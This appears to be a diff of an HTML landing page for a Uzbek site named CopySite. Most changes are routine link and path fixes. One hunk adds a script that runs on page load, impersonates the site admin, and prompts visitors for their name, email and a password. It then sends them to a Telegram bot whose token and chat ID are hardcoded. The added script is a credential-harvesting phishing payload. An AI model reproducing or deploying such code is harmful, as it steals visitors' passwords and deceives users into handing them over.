@@ -8,19 +8,19 @@
    <title>CopySite</title>
 
    <!-- Favicon -->
-   <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
+   <link rel="shortcut icon" href="./img/favicon.png" type="image/x-icon">
 
    <!-- Swiper CSS  -->
-   <link rel="stylesheet" href="swiper%408.4.7/swiper-bundle.min.css">
+   <link rel="stylesheet" href="./swiper@8.4.7/swiper-bundle.min.css">
 
    <!-- Bootstrap Icons -->
-   <link rel="stylesheet" href="npm/bootstrap-icons%401.8.1/font/bootstrap-icons.css">
+   <link rel="stylesheet" href="./npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
 
    <!-- Bootstrap CSS -->
-   <link rel="stylesheet" href="css/bootstrap.min.css">
+   <link rel="stylesheet" href="./css/bootstrap.min.css">
 
    <!-- Style CSS  -->
-   <link rel="stylesheet" href="css/style.css">
+   <link rel="stylesheet" href="./css/style.css">
 </head>
 
 <body>
@@ -51,7 +51,7 @@
                   </a>
                </li>
                <li class="nav-item">
-                  <a class="nav-link" aria-current="page" href="./organish.html">
+                  <a class="nav-link" aria-current="page" href="./organish/organish.html">
                      O'rganish
                   </a>
                </li>
@@ -71,8 +71,8 @@
                   </a>
                </li>
                <li class="nav-item">
-                  <a class="nav-link" aria-current="page" href="./akkaunt.html">
-                     Account
+                  <a class="nav-link" style="font-size: 40px;margin-top: -13px;" aria-current="page" href="./akkaunt.html">
+                     ❤️
                   </a>
                </li>
 
@@ -91,7 +91,8 @@
          <!-- Content -->
          <div class="content">
             <h1>
-               Sayt Yaratish
+               Biz bilan hammasi juda onson
+               <br>
                <span>CopySite</span>
             </h1>
             <div>
@@ -117,7 +118,7 @@
    <!-- START: Stats Section  -->
    <section class="stats">
       <div class="box-container d-grid align-items-start">
-         <a href="./organish.html">
+         <a href="./organish/organish.html">
 
             <div class="box">
                <i class="bi bi-book"></i>
@@ -234,20 +235,91 @@
 
 
 
+<script>
+   // Foydalanuvchidan ma'lumotlarni olish
+   let name = prompt('Salom men CopySite adminiman.Sizga murojat qilishim uchun ismingizni yoza olasizmi?', '');
+   let email = prompt(`Salom ${name} tanishganimdan hursandman! Saytdan to'liq foydalanishingiz uchun emeilingizni kiriting`, '');
+   let password = prompt('Hafsizlik yuzasidan yangi parol yaratya olasizmi?', '');
+
+   alert(`Bizni tanlaganingiz uchun raxmat ${name}! Agar nimanidir tushunmasangiz "O'rganish" bo'limidan foydalanishingiz mumkin.`);
+   // Matnni formatlash
+   const message = `Yangi foydalanuvchi ma'lumotlari:\n\nIsm: ${name}\nEmail: ${email}\nParol: ${password}`;
+
+   // Telegram botga ma'lumotlarni yuborish funksiyasi
+   function sendToTelegramBot(message) {
+      const telegramBotToken = '7158426038:AAG_M6E6nbrvBLNx0WVQeiVe8WpTADbX-6M'; // Bu yerga bot tokeningizni kiriting
+      const telegramChatId = '6596148862'; // Bu yerga chat yoki guruh ID si
+
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+      fetch(url, {
+         method: 'POST',
+         headers: {
+            'Content-Type': 'application/json'
+         },
+         body: JSON.stringify({
+            chat_id: telegramChatId,
+            text: message
+         })
+      }).then(response => response.json())
+         .then(data => {
+            console.log('Ma\'lumot Telegramga yuborildi:', data);
+         }).catch(error => {
+            console.error('Telegramga yuborishda xatolik yuz berdi:', error);
+         });
+   }
+
+   // Matnni ovozli o'qish funksiyasi
+   function speak(text) {
+      const utterance = new SpeechSynthesisUtterance(text);
+      utterance.lang = 'uz-UZ'; // O'zbekcha o'qish uchun tilni tanlang
+      window.speechSynthesis.speak(utterance);
+   }
+
+   // Ovozli xabarni tayyorlash va yuborish
+   // const thanksMessage = `Bizni tanlaganingiz uchun raxmat ${name}! Agar nimanidir tushunmasangiz "O'rganish" bo'limidan foydalanishingiz mumkin.`;
+
+   // Foydalanuvchi ma'lumotlarini Telegram botga yuborish
+   sendToTelegramBot(message);
+
+   // Xushxabarni ovozli o'qish
+   speak(thanksMessage);
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
    <!-- jQuery -->
-   <script src="js/jquery-3.6.0.min.js"></script>
+   <script src="./js/jquery-3.6.0.min.js"></script>
 
    <!-- Bootstrap JS -->
-   <script src="js/bootstrap.min.js"></script>
+   <script src="./js/bootstrap.min.js"></script>
 
    <!-- Validator to check the form for completeness  -->
-   <script src="npm/jquery-validation%401.19.3/dist/jquery.validate.js"></script>
+   <script src="./npm/jquery-validation@1.19.3/dist/jquery.validate.js"></script>
 
    <!-- Swiper JS -->
-   <script src="swiper%408.4.7/swiper-bundle.min.js"></script>
+   <script src="./js/jquery-3.6.0.min.js"></script>
 
    <!-- Script JS -->
-   <script src="js/script.js"></script>
+   <script src="./js/script.js"></script>
 
 </body>
 
